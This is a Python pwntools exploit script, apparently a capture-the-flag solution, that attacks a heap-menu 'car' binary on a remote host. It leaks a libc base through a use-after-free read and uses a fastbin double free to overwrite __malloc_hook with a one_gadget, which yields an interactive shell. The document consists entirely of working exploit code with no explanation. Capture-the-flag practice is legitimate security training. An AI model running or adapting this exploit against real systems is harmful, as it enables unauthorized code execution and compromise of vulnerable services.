from pwn import *
import sys

elf = ELF('vuln')
libc = ELF('libc-2.23.so')
context.update(binary=elf)

one_gadgets = [0x45226, 0x4527a, 0xf03a4, 0xf1247]

if args.LOCAL:
    p = elf.process()
else:
    host = 'gc1.eng.run'
    port = 32224
    p = remote(host, port)

def buy(car, payload=b''):
    mapp = {1:0x18, 2:0x68, 3:0x1f8}
    payload += b'\x00' * (mapp[car] - 1 - len(payload))
    p.sendlineafter(b'> ', b'1')
    p.sendlineafter(b'> ', str(car).encode())
    p.sendlineafter(b'Model of Car: ', payload)
    idx = int(p.recvline()[7:-1].decode())
    return idx

def sell(idx):
    p.sendlineafter(b'> ', b'2')
    p.sendlineafter(b'Index: ', str(idx).encode())

def view(idx):
    p.sendlineafter(b'> ', b'3')
    p.sendlineafter(b'Index: ', str(idx).encode())
    r = p.recvlines(2)[1][1:]
    return r

buy(3) # 0
buy(2) # 1
buy(2) # 2
buy(2) # 3
buy(1) # 4
sell(0)

leak = u64(view(0).ljust(8, b'\x00'))
libc.address = leak - 0x3c4b78
one_gadget = libc.address + one_gadgets[2]
malloc_hook = libc.symbols['__malloc_hook'] - 0x30 + 0xd

log.info(f'Libc base: {hex(libc.address)}')
log.info(f'__malloc_hook: {hex(libc.symbols["__malloc_hook"])}')
log.info(f'Gadget: {hex(one_gadget)}')

sell(1)
sell(2)
sell(3)
sell(2)

buy(2, p64(malloc_hook))
buy(2)
buy(2)

buy(2, b'A' * 19 + p64(one_gadget))

p.sendlineafter(b'> ', b'1')
p.sendlineafter(b'> ', b'2')

p.interactive()
p.close()
